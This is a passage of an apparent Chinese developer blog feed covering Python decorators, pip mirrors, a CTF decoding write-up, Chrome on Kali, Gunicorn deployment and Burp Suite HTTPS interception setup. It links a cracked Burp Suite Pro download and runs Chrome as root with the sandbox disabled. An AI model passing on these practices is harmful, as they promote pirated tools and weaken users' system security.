-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">use_logging</span><span class="params">(level)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">decorator</span><span class="params">(func)</span>:</span></span><br><span class="line">        <span class="function"><span class="keyword">def</span> <span class="title">wrapper</span><span class="params">(*args, **kwargs)</span>:</span></span><br><span class="line">            <span class="keyword">if</span> level == <span class="string">"warn"</span>:</span><br><span class="line">                logging.warn(<span class="string">"%s is running"</span> % func.__name__)</span><br><span class="line">            <span class="keyword">return</span> func(*args)</span><br><span class="line">        <span class="keyword">return</span> wrapper</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> decorator</span><br><span class="line"></span><br><span class="line"><span class="meta">@use_logging(level="warn")</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">foo</span><span class="params">(name=<span class="string">'foo'</span>)</span>:</span></span><br><span class="line">    print(<span class="string">"i am %s"</span> % name)</span><br><span class="line"></span><br><span class="line">foo()</span><br></pre></td></tr></table></figure>
-<p>上面的use_logging是允许带参数的装饰器。它实际上是对原有装饰器的一个函数封装，并返回一个装饰器。我们可以将它理解为一个含有参数的闭包。当我 们使用@use_logging(level=”warn”)调用的时候，Python能够发现这一层的封装，并把参数传递到装饰器的环境中。</p>
-<h3 id="类装饰器"><a href="#类装饰器" class="headerlink" title="类装饰器"></a>类装饰器</h3><p>再来看看类装饰器，相比函数装饰器，类装饰器具有灵活度大、高内聚、封装性等优点。使用类装饰器还可以依靠类内部的<code>__call__</code>方法，当使用 @ 形式将装饰器附加到函数上时，就会调用此方法。<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Foo</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, func)</span>:</span></span><br><span class="line">    self._func = func</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">__call__</span><span class="params">(self)</span>:</span></span><br><span class="line">    <span class="keyword">print</span> (<span class="string">'class decorator runing'</span>)</span><br><span class="line">    self._func()</span><br><span class="line">    <span class="keyword">print</span> (<span class="string">'class decorator ending'</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@Foo</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bar</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">print</span> (<span class="string">'bar'</span>)</span><br><span class="line"></span><br><span class="line">bar()</span><br></pre></td></tr></table></figure></p>
-<h3 id="functools-wraps"><a href="#functools-wraps" class="headerlink" title="functools.wraps"></a>functools.wraps</h3><p>使用装饰器极大地复用了代码，但是他有一个缺点就是原函数的元信息不见了，比如函数的<code>docstring</code>、<code>__name__</code>、参数列表，先看例子：<br>装饰器<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">logged</span><span class="params">(func)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">with_logging</span><span class="params">(*args, **kwargs)</span>:</span></span><br><span class="line">        <span class="keyword">print</span> func.__name__ + <span class="string">" was called"</span></span><br><span class="line">        <span class="keyword">return</span> func(*args, **kwargs)</span><br><span class="line">    <span class="keyword">return</span> with_logging</span><br></pre></td></tr></table></figure></p>
-<p>函数<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">@logged</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">f</span><span class="params">(x)</span>:</span></span><br><span class="line">   <span class="string">"""does some math"""</span></span><br><span class="line">   <span class="keyword">return</span> x + x * x</span><br></pre></td></tr></table></figure></p>
-<p>该函数完成等价于：<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">f</span><span class="params">(x)</span>:</span></span><br><span class="line">    <span class="string">"""does some math"""</span></span><br><span class="line">    <span class="keyword">return</span> x + x * x</span><br><span class="line">f = logged(f)</span><br></pre></td></tr></table></figure></p>
-<p>不难发现，函数f被with_logging取代了，当然它的<code>docstring</code>，<code>__name__</code>就是变成了<code>with_logging</code>函数的信息了。<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">print</span> f.__name__    <span class="comment"># prints 'with_logging'</span></span><br><span class="line"><span class="keyword">print</span> f.__doc__     <span class="comment"># prints None</span></span><br></pre></td></tr></table></figure></p>
-<p>这个问题就比较严重的，好在我们有<code>functools.wraps</code>，wraps本身也是一个装饰器，它能把原函数的元信息拷贝到装饰器函数中，这使得装饰器函数也有和原函数一样的元信息了。</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> functools <span class="keyword">import</span> wraps</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">logged</span><span class="params">(func)</span>:</span></span><br><span class="line"><span class="meta">    @wraps(func)</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">with_logging</span><span class="params">(*args, **kwargs)</span>:</span></span><br><span class="line">        <span class="keyword">print</span> func.__name__ + <span class="string">" was called"</span></span><br><span class="line">        <span class="keyword">return</span> func(*args, **kwargs)</span><br><span class="line">    <span class="keyword">return</span> with_logging</span><br><span class="line"></span><br><span class="line"><span class="meta">@logged</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">f</span><span class="params">(x)</span>:</span></span><br><span class="line">    <span class="string">"""does some math"""</span></span><br><span class="line">    <span class="keyword">return</span> x + x * x</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> f.__name__  <span class="comment"># prints 'f'</span></span><br><span class="line"><span class="keyword">print</span> f.__doc__   <span class="comment"># prints 'does some math'</span></span><br></pre></td></tr></table></figure>
-<h3 id="内置装饰器"><a href="#内置装饰器" class="headerlink" title="内置装饰器"></a>内置装饰器</h3><p><code>@staticmathod</code>、<code>@classmethod</code>、<code>@property</code></p>
-<h3 id="装饰器的顺序"><a href="#装饰器的顺序" class="headerlink" title="装饰器的顺序"></a>装饰器的顺序</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">@a</span></span><br><span class="line"><span class="meta">@b</span></span><br><span class="line"><span class="meta">@c</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">f</span> <span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">pass</span></span><br></pre></td></tr></table></figure>
-<p>等效于<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">f = a(b(c(f)))</span><br></pre></td></tr></table></figure></p>
-<p><br></p>
-<blockquote>
-<p>作者：zhijun liu<br>链接：<a href="https://www.zhihu.com/question/26930016/answer/99243411" target="_blank" rel="external">https://www.zhihu.com/question/26930016/answer/99243411</a><br>来源：知乎<br>著作权归作者所有，转载请联系作者获得授权。</p>
-</blockquote>
-<h3 id="个人练习"><a href="#个人练习" class="headerlink" title="个人练习"></a>个人练习</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> functools <span class="keyword">import</span> wraps</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> randint</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> redis</span><br><span class="line"><span class="keyword">import</span> time, datetime</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Decorator</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="string">"""装饰器类"""</span></span><br><span class="line">    func_cache_dict = &#123;&#125;</span><br><span class="line">    func_cache_key = <span class="string">'func_cache'</span></span><br><span class="line">    rds = redis.StrictRedis()</span><br><span class="line"></span><br><span class="line"><span class="meta">    @classmethod</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">func_cache</span><span class="params">(cls, func)</span>:</span></span><br><span class="line"><span class="meta">        @wraps(func)</span></span><br><span class="line">        <span class="function"><span class="keyword">def</span> <span class="title">wrapper</span><span class="params">(*args, **kargs)</span>:</span></span><br><span class="line">            argstr = <span class="string">'&#123;0&#125;+&#123;1&#125;+&#123;2&#125;'</span>.format(func.__name__,</span><br><span class="line">                <span class="string">'+'</span>.join(str(i) <span class="keyword">for</span> i <span class="keyword">in</span> args),</span><br><span class="line">                <span class="string">'+'</span>.join(<span class="string">'&#123;0&#125;=&#123;1&#125;'</span>.format(k,v) <span class="keyword">for</span> k,v <span class="keyword">in</span> kargs.iteritems()))</span><br><span class="line">            uniqid = md5(argstr).hexdigest()</span><br><span class="line">            <span class="keyword">if</span> uniqid <span class="keyword">not</span> <span class="keyword">in</span> cls.func_cache_dict:</span><br><span class="line">                <span class="keyword">try</span>:</span><br><span class="line">                    res = func(*args, **kargs)</span><br><span class="line">                <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                    logging.error(e, exc_info=<span class="keyword">True</span>)</span><br><span class="line">                    <span class="keyword">return</span> <span class="keyword">None</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    cls.func_cache_dict[uniqid] = res</span><br><span class="line">            <span class="keyword">return</span> cls.func_cache_dict[uniqid]</span><br><span class="line">        <span class="keyword">return</span> wrapper</span><br><span class="line"></span><br><span class="line"><span class="meta">    @classmethod</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">fun_cache_expire</span><span class="params">(cls, expire_time)</span>:</span></span><br><span class="line">        <span class="keyword">assert</span> isinstance(expire_time, int), <span class="string">'expire_time must be a integer.'</span></span><br><span class="line">        <span class="function"><span class="keyword">def</span> <span class="title">decorator</span><span class="params">(func)</span>:</span></span><br><span class="line"><span class="meta">            @wraps(func)</span></span><br><span class="line">            <span class="function"><span class="keyword">def</span> <span class="title">wrapper</span><span class="params">(*args, **kargs)</span>:</span></span><br><span class="line">                argstr = <span class="string">'&#123;0&#125;+&#123;1&#125;+&#123;2&#125;'</span>.format(func.__name__,</span><br><span class="line">                    <span class="string">'+'</span>.join(str(i) <span class="keyword">for</span> i <span class="keyword">in</span> args),</span><br><span class="line">                    <span class="string">'+'</span>.join(<span class="string">'&#123;0&#125;=&#123;1&#125;'</span>.format(k,v) <span class="keyword">for</span> k,v <span class="keyword">in</span> kargs.iteritems()))</span><br><span class="line">                uniqid = md5(argstr).hexdigest()</span><br><span class="line">                expire_at = float(cls.rds.get(cls.func_cache_key + uniqid) <span class="keyword">or</span> <span class="number">0</span>)</span><br><span class="line">                cond1 = (uniqid <span class="keyword">not</span> <span class="keyword">in</span> cls.func_cache_dict)</span><br><span class="line">                cond2 = (time.time() &gt; expire_at)</span><br><span class="line">                <span class="comment"># print 'cond1:&#123;0&#125;, cond2:&#123;1&#125;'.format(cond1, cond2)</span></span><br><span class="line">                <span class="keyword">if</span> cond1 <span class="keyword">or</span> cond2:</span><br><span class="line">                    <span class="keyword">try</span>:</span><br><span class="line">                        res = func(*args, **kargs)</span><br><span class="line">                    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                        logging.error(e, exc_info=<span class="keyword">True</span>)</span><br><span class="line">                        <span class="keyword">return</span> <span class="keyword">None</span></span><br><span class="line">                    <span class="keyword">else</span>:</span><br><span class="line">                        cls.func_cache_dict[uniqid] = res</span><br><span class="line">                        cls.rds.setex(cls.func_cache_key + uniqid, </span><br><span class="line">                            datetime.timedelta(seconds=expire_time), </span><br><span class="line">                            time.time() + expire_time)</span><br><span class="line">                <span class="keyword">return</span> cls.func_cache_dict[uniqid]</span><br><span class="line">            <span class="keyword">return</span> wrapper</span><br><span class="line">        <span class="keyword">return</span> decorator</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">randomstr1</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> os.urandom(<span class="number">8</span>).encode(<span class="string">'hex'</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@Decorator.func_cache</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">randomstr2</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> os.urandom(<span class="number">8</span>).encode(<span class="string">'hex'</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@Decorator.fun_cache_expire(3)</span></span><br><span class="line"><span class="comment"># 结果缓存三秒</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">randomstr3</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> os.urandom(<span class="number">8</span>).encode(<span class="string">'hex'</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@Decorator.fun_cache_expire(1)</span></span><br><span class="line"><span class="comment"># 带参数的函数</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">randomstr4</span><span class="params">(*args)</span>:</span></span><br><span class="line">    s = <span class="string">'_'</span>.join(str(i) <span class="keyword">for</span> i <span class="keyword">in</span> args)</span><br><span class="line">    <span class="keyword">return</span> md5(s).hexdigest()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">8</span>):</span><br><span class="line">    args = [randint(<span class="number">1</span>,<span class="number">100</span>) <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">3</span>)]</span><br><span class="line">    <span class="keyword">print</span> randomstr1(), randomstr2(), randomstr3(), randomstr4(*args)</span><br><span class="line">    time.sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> randomstr1(), randomstr2(), randomstr3(), randomstr4(*args)</span><br></pre></td></tr></table></figure>
-<p>运行结果：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">302e93d809adda2f 828719ab1a357f0a 9e9a3d8e26d8b101 71078<span class="built_in">cd</span>8bf589b0a82a4d64867a4fca9</span><br><span class="line">8ff79b5be99afab7 828719ab1a357f0a 9e9a3d8e26d8b101 2642897d9d2e5d403790f5efcb51c9de</span><br><span class="line">284014dc432de190 828719ab1a357f0a 9e9a3d8e26d8b101 79c3b2f9cee061069dc95f27ec93893b</span><br><span class="line"><span class="comment"># randomstr3 函数结果缓存3秒，所以3秒变换一次结果</span></span><br><span class="line">8d6201c551e12e08 828719ab1a357f0a bae42a9245254d39 840d506ee9004882b3b8537c722cc917</span><br><span class="line">8038c2c75f0e2584 828719ab1a357f0a bae42a9245254d39 454715c6f86330eebf9a79d65c4c519d</span><br><span class="line">1ad603c8b1c0f862 828719ab1a357f0a bae42a9245254d39 0c69a374754d0c546fe588ff638c4376</span><br><span class="line">f3a35c418c35084c 828719ab1a357f0a 6997bc4c1a5c6acf 71a735b4c528d6eb7bc49375f2e031a7</span><br><span class="line">d42fcb94450a61aa 828719ab1a357f0a 6997bc4c1a5c6acf 4d309f93de6bcb766ca623d9270cf422</span><br><span class="line"><span class="comment"># randomstr4 函数最后一次执行的入参与上次相同，所以结果与上一次相同</span></span><br><span class="line">90e416f4a6177b8d 828719ab1a357f0a 6997bc4c1a5c6acf 4d309f93de6bcb766ca623d9270cf422</span><br></pre></td></tr></table></figure></p>
-]]></content>
-    </entry>
-    
-    <entry>
-      <title><![CDATA[pip设置国内源]]></title>
-      <url>http://sha256.cc/2016/11/28/pypi-source-setting/</url>
-      <content type="html"><![CDATA[<blockquote class="blockquote-center"><p>每次学习编程的时候都会遇到许多运维的问题。身为立志成为一名全站工程师的我，只有不断折腾了。</p>
-</blockquote><a id="more"></a>
-<p>pip的默认下载源是国外的，所以不是很快，类似yum我们想替换成国内的源，比如：</p>
-<ul>
-<li>阿里云 <a href="http://mirrors.aliyun.com/pypi/simple/" target="_blank" rel="external">http://mirrors.aliyun.com/pypi/simple/</a>  </li>
-<li>豆瓣 <a href="https://pypi.doubanio.com/simple/" target="_blank" rel="external">https://pypi.doubanio.com/simple/</a>  </li>
-</ul>
-<p>网上搜到的地址很多都是过期的，验证方法是用浏览器打开的能看到包列表的地址。比如<code>https://pypi.douban.com/simple/</code>用浏览器打开会跳转至<code>https://pypi.doubanio.com/simple/</code>，这才是最终的正确地址。</p>
-<p>以豆瓣源为例，在Linux下面，创建/etc/pip.conf，编辑内容如下:</p>
-<figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="section">[global]</span></span><br><span class="line"><span class="attr">timeout</span> = <span class="number">60</span></span><br><span class="line"><span class="attr">trusted-host</span>=pypi.doubanio.com</span><br><span class="line"><span class="attr">index-url</span>=https://pypi.doubanio.com/simple/</span><br></pre></td></tr></table></figure>
-<p>保存即可生效，甚至包括virtualenv创建出来的pip也会用这个源。</p>
-<h3 id="临时用法"><a href="#临时用法" class="headerlink" title="临时用法"></a>临时用法</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pip install xxx -i http://mirrors.aliyun.com/pypi/simple/</span><br></pre></td></tr></table></figure>
-<h3 id="更多设置"><a href="#更多设置" class="headerlink" title="更多设置"></a>更多设置</h3><p>可以针对不同Linux用户设置不同源，详见 <a href="https://pip.pypa.io/en/stable/user_guide/#configuration" target="_blank" rel="external">https://pip.pypa.io/en/stable/user_guide/#configuration</a></p>
-]]></content>
-    </entry>
-    
-    <entry>
-      <title><![CDATA[根据php加密算法编写python解密代码]]></title>
-      <url>http://sha256.cc/2016/10/09/php2python-code/</url>
-      <content type="html"><![CDATA[<p>服务器搬家，暂时无法工作，拿起一道<a href="http://www.shiyanbar.com/ctf/1760" target="_blank" rel="external">CTF</a>练练手。<a id="more"></a></p>
-<p>php代码是一张图片:</p>
-<p><img src="/images/ctf_web200.jpg" alt="ctf"></p>
-<p>使用了<code>rot13</code>、逆序、base64等方法加密，我们将其翻译成python代码：</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rot13</span><span class="params">(s, offset=<span class="number">13</span>)</span>:</span></span><br><span class="line">    <span class="string">'''</span><br><span class="line">    ROT-13 编码是一种每一个字母被另一个字母代替的方法。</span><br><span class="line">    这个代替字母是由原来的字母向前移动 13 个字母而得到的。数字和非字母字符保持不变。</span><br><span class="line">    '''</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">encodeCh</span><span class="params">(ch)</span>:</span></span><br><span class="line">        f=<span class="keyword">lambda</span> x: chr((ord(ch)-x+offset) % <span class="number">26</span> + x)</span><br><span class="line">        <span class="keyword">return</span> f(<span class="number">97</span>) <span class="keyword">if</span> ch.islower() <span class="keyword">else</span> (f(<span class="number">65</span>) <span class="keyword">if</span> ch.isupper() <span class="keyword">else</span> ch)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">''</span>.join(encodeCh(c) <span class="keyword">for</span> c <span class="keyword">in</span> s)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encode</span><span class="params">(s)</span>:</span></span><br><span class="line">    oo = <span class="string">''</span></span><br><span class="line">    o = s[::<span class="number">-1</span>]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, len(o)):</span><br><span class="line">        c = chr(ord(o[i])+<span class="number">1</span>)</span><br><span class="line">        oo += c</span><br><span class="line">    <span class="keyword">return</span> rot13(base64.b64encode(oo)[::<span class="number">-1</span>])</span><br></pre></td></tr></table></figure>
-<p>照着encode函数，很容易可以写出来decode函数:</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decode</span><span class="params">(s)</span>:</span></span><br><span class="line">    o = <span class="string">''</span></span><br><span class="line">    oo = base64.b64decode(rot13(s)[::<span class="number">-1</span>])</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, len(oo)):</span><br><span class="line">        c = chr(ord(oo[i])<span class="number">-1</span>)</span><br><span class="line">        o += c</span><br><span class="line">    <span class="keyword">return</span> o[::<span class="number">-1</span>]</span><br></pre></td></tr></table></figure>
-<p>密文<code>s=a1zLbgQsCESEIqRLwuQAyMwLyq2L5VwBxqGA3RQAyumZ0tmMvSGM2ZwB4tws</code>, 我们调用一下decode函数，直接得到结果。</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kaliSec:~/文档<span class="comment"># python 1.py </span></span><br><span class="line">a1zL<span class="built_in">bg</span>QsCESEIqRLwuQAyMwLyq2L5VwBxqGA3RQAyumZ0tmMvSGM2ZwB4tws flag:&#123;NSCTF_b73d5adfb819c64603d7237fa0d52977&#125;</span><br></pre></td></tr></table></figure>
-<p>语言都是相通的，熟悉算法和数据结构更为关键。</p>
-]]></content>
-    </entry>
-    
-    <entry>
-      <title><![CDATA[Kali Linux 2016.1 安装 Chrome]]></title>
-      <url>http://sha256.cc/2016/09/18/kali-linux-install-chrome/</url>
-      <content type="html"><![CDATA[<p>Kali Linux 2016.1 Rolling Edtion 预装的是iceweasel浏览器，如果要使用chrome需要自己下载安装包并需要额外的设置。<a id="more"></a></p>
-<h2 id="1-下载地址"><a href="#1-下载地址" class="headerlink" title="1. 下载地址"></a>1. 下载地址</h2><p>wget <a href="https://dl.google.com/linux/direct/google-chrome-stable_current_amd64.deb" target="_blank" rel="external">https://dl.google.com/linux/direct/google-chrome-stable_current_amd64.deb</a><br>实测不用翻墙，速度还挺快。</p>
-<h2 id="2-安装命令"><a href="#2-安装命令" class="headerlink" title="2. 安装命令"></a>2. 安装命令</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">dpkg -i google-chrome-stable_current_amd64.deb</span><br></pre></td></tr></table></figure>
-<p>如果缺少依赖：</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">apt-get install <span class="_">-f</span></span><br></pre></td></tr></table></figure>
-<h2 id="3-运行设置"><a href="#3-运行设置" class="headerlink" title="3. 运行设置"></a>3. 运行设置</h2><p>安装完chrome之后我们发现并不能正常打开它，需要在<code>/usr/share/application</code>里找到chrome的快捷方式，在原先的运行命令添加<code>--no-sandbox</code>和<code>--user-dir-data</code>。</p>
-<ul>
-<li><code>--no-sandbox</code> 解决点击图片无响应问题</li>
-<li><code>--user-dir-data</code> 解决Chrome不能在root用户下运行的问题</li>
-</ul>
-<p><img src="/images/chrome-setting.png" alt="chrome-setting"></p>
-]]></content>
-    </entry>
-    
-    <entry>
-      <title><![CDATA[使用Gunicorn部署Flask Web服务]]></title>
-      <url>http://sha256.cc/2016/08/31/gunicorn-with-flask/</url>
-      <content type="html"><![CDATA[<h2 id="Flask"><a href="#Flask" class="headerlink" title="Flask"></a>Flask</h2><p>Flask 虽然自带 Web 服务器，但是该服务器性能较低，是单进程单线程模型，原本是供开发测试使用。所以我们在生产环境中需要使用 Gunicorn 这样高性能服务器部署Flask服务。<a id="more"></a></p>
-<h2 id="Gunicorn"><a href="#Gunicorn" class="headerlink" title="Gunicorn"></a>Gunicorn</h2><p>Gunicorn ‘Green Unicorn’ 是一个 UNIX 下的 WSGI HTTP 服务器，它是一个移植自 Ruby 的 Unicorn 项目的 pre-fork worker 模型。它既支持 eventlet，也支持 greenlet。在 Gunicorn 上运行 Flask 应用非常简单:</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gunicorn myproject:app</span><br></pre></td></tr></table></figure>
-<p>Gunicorn 提供许多命令行参数，可以使用 gunicorn -h 来获得帮助。下面的例子 使用 4 worker 进程（ -w 4 ）来运行 Flask 应用，绑定到 localhost 的 4000 端口（ -b 127.0.0.1:4000 ）:</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gunicorn -w 4 -b 127.0.0.1:4000 myproject:app</span><br></pre></td></tr></table></figure>
-<h2 id="几点注意的地方"><a href="#几点注意的地方" class="headerlink" title="几点注意的地方"></a>几点注意的地方</h2><p>1.Gunicorn 日志分为 accesslog 和 errorlog，但是如果你没有配置这两个选项，它们不会被打印出来。</p>
-<p>2.被 Gunicorn 包裹的web服务日志，可以改写输出到 Gunicorn errorlog 上，记得设置 errorlog 的 loglevel ，要不然你可能看不到日志。</p>
-<p>3.如果 Gunicorn 开启了多进程，原来服务的日志系统也需要兼容多进程，或者仅输出到 Gunicorn 的 errorlog 上，写法如：</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">app.logger.setLevel(logging.INFO)</span><br><span class="line">app.logger.handlers.extend(logging.getLogger(<span class="string">"gunicorn.error"</span>).handlers)</span><br></pre></td></tr></table></figure>
-<p>我猜测这样是多进程安全的，仅仅是<strong>猜测</strong>!</p>
-<p>4.<del>如果你的服务在启动和结束之前还要执行其他操作，目前我不知道Gunicorn如何实现，官方给了自定义Gunicorn的写法，但是我遇到了无法结束的bug。参见：<a href="http://docs.gunicorn.org/en/stable/custom.html" target="_blank" rel="external">http://docs.gunicorn.org/en/stable/custom.html</a></del></p>
-<p><code>gunicorn server-hooks</code> 提供这样的功能, 只需要在配置文件中添加对应的函数:</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">sys.path.append(os.path.abspath(os.path.dirname(__file__)))</span><br><span class="line"><span class="keyword">from</span> spectre <span class="keyword">import</span> crons</span><br><span class="line">bind = <span class="string">':5000'</span></span><br><span class="line">loglevel = <span class="string">'info'</span></span><br><span class="line">access_log_format = <span class="string">'%(h)s %(l)s %(u)s "%(r)s" %(s)s %(b)s "%(f)s" "%(a)s"'</span></span><br><span class="line">accesslog = <span class="string">"/dev/null"</span></span><br><span class="line">errorlog = <span class="string">"/dev/null"</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">on_starting</span><span class="params">(server)</span>:</span></span><br><span class="line">    <span class="comment"># gunicorn 主进程启动之前的操作</span></span><br><span class="line">    crons.start()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">on_exit</span><span class="params">(server)</span>:</span></span><br><span class="line">    <span class="comment"># gunicorn 退出之后的操作</span></span><br><span class="line">    crons.stop()</span><br></pre></td></tr></table></figure>
-<p>还有其他的钩子函数，参考：<a href="http://docs.gunicorn.org/en/latest/settings.html#server-hooks" target="_blank" rel="external">http://docs.gunicorn.org/en/latest/settings.html#server-hooks</a></p>
-<h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>原来喜欢用 python 不喜欢 php 写 web 最大的原因之一就是 php 必须假设在一个web服务器上，配置麻烦。现在发现python web框架自带的服务器就是个玩具而已，生产配置是一样的麻烦。</p>
-<p>我还是太年轻了。也许可以花时间学下php，在适合的场景用适合的语言。</p>
-]]></content>
-    </entry>
-    
-    <entry>
-      <title><![CDATA[Burpsuite初探]]></title>
-      <url>http://sha256.cc/2016/08/05/burpsuite-install/</url>
-      <content type="html"><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>Burp Suite是响当当的web应用程序渗透测试集成平台。从应用程序攻击表面的最初映射和分析，到寻找和利用安全漏洞等过程，所有工具为支持整体测试程序而无缝地在一起工作。<br><a id="more"></a></p>
-<h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p>版本：Burp suite pro v1.6.34（破解版本）<br>下载地址：<a href="http://download.csdn.net/download/luckchoudog/9451559" target="_blank" rel="external">http://download.csdn.net/download/luckchoudog/9451559</a><br>安装JDK:</p>
-<ul>
-<li><a href="https://www.baidu.com/link?url=mbk3bkGorHt1Q21233i1-7PFkVyPYx_C17XzCf2Ussr1p7M-05bC4rNpOrK6vZwuJj4rywaUYTCDJiuUvIOnbvSdA_6sYILjE-Lo7o2auSi&amp;wd=&amp;eqid=881f494f000c50500000000557a45eb9" target="_blank" rel="external">百度下载</a></li>
-<li><a href="http://www.oracle.com/technetwork/java/javase/downloads/jdk8-downloads-2133151.html" target="_blank" rel="external">官方下载</a></li>
-</ul>
-<h2 id="启动"><a href="#启动" class="headerlink" title="启动"></a>启动</h2><p>解压<code>Burp suite pro v1.6.34.rar</code>，执行<code>BurpLoader.jar</code>即可。</p>
-<p><img src="/images/burpsuite1.png" alt="burpsuite1"></p>
-<h2 id="HTTPS代理抓包设置"><a href="#HTTPS代理抓包设置" class="headerlink" title="HTTPS代理抓包设置"></a>HTTPS代理抓包设置</h2><p>1.访问代理服务器WEB界面<code>http://127.0.0.1:8080</code>，如果访问不了，更改为下图设置中的地址：</p>
-<p><img src="/images/burpsuite2.png" alt="burpsuite2"></p>
-<p>2.下载证书</p>
-<p><img src="/images/burpsuite3.png" alt="burpsuite3"></p>
-<p>3.双击文件安装到 <strong>受信任的根证书颁发机构</strong></p>
-<p><img src="/images/burpsuite4.png" alt="burpsuite4"></p>
-<p>4.导出为<code>cer</code>格式证书</p>
-<p><img src="/images/burpsuite5.png" alt="burpsuite5"></p>
-<p>5.安装<code>cer</code>证书到 <strong>受信任的根证书颁发机构</strong></p>
-<p>同步骤3</p>
-<h2 id="HTTPS代理抓包设置（Chrome-in-Linux）"><a href="#HTTPS代理抓包设置（Chrome-in-Linux）" class="headerlink" title="HTTPS代理抓包设置（Chrome  in Linux）"></a>HTTPS代理抓包设置（Chrome  in Linux）</h2><p>如果是在Linux下，打开<code>Chrome</code>-<code>Setting</code>-<code>HTTPS/SSL</code>-<code>Manage certificates...</code>, 选择<code>Authorities</code>这一栏，导入证书文件即可。</p>
-<p><img src="/images/burp-chrome-linux-setting.png" alt="burp-chrome-linux-setting"></p>
-<h2 id="HTTPS代理抓包效果"><a href="#HTTPS代理抓包效果" class="headerlink" title="HTTPS代理抓包效果"></a>HTTPS代理抓包效果</h2><p><img src="/images/burpsuite6.png" alt="burpsuite6"></p>
